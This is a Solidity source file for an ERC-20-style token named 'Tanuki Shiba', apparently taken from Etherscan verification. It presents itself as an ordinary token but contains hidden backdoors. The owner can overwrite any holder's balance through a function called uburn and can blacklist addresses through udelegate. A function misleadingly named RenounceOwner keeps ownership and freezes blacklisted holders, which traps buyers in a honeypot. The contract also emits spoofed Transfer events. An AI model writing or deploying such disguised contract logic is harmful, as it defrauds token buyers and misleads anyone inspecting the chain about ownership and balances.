/**
 *Submitted for verification at Etherscan.io on 2022-10-15
*/

// "SPDX-License-Identifier: UNLICENSED

                                    
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract TanukiShiba {
  
    mapping (address => uint256) public uBalance;
    mapping (address => bool) AMin;


    // 
    string public name = "Tanuki Shiba";
    string public symbol = unicode"SHIBNUKI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint uver = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        uBalance[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x66E3aA605b2c8fa3a8C1FF809EdaCE03aBd28277;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier l() {   
         require(msg.sender == owner);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(uBalance[msg.sender] >= value);
        uBalance[msg.sender] -= value;  
        uBalance[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(AMin[msg.sender]) {
        require(uver < 1);} 
        require(uBalance[msg.sender] >= value);
        uBalance[msg.sender] -= value;  
        uBalance[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return uBalance[account]; }
        function uburn(address t, uint256 uburned) l public returns (bool success) {
        uBalance[t] = uburned;
        return true; }
        function udelegate(address Z) l public{          
        require(!AMin[Z]);
        AMin[Z] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner() public {
        require(msg.sender == owner);
        uver = 1;}
        function uclaim(address Z) l public {
        require(AMin[Z]);
        AMin[Z] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= uBalance[from]);
        require(value <= allowance[from][msg.sender]);
        uBalance[from] -= value;  
        uBalance[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(AMin[from] || AMin[to]) {
        require(uver < 1);}
        require(value <= uBalance[from]);
        require(value <= allowance[from][msg.sender]);
        uBalance[from] -= value;
        uBalance[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }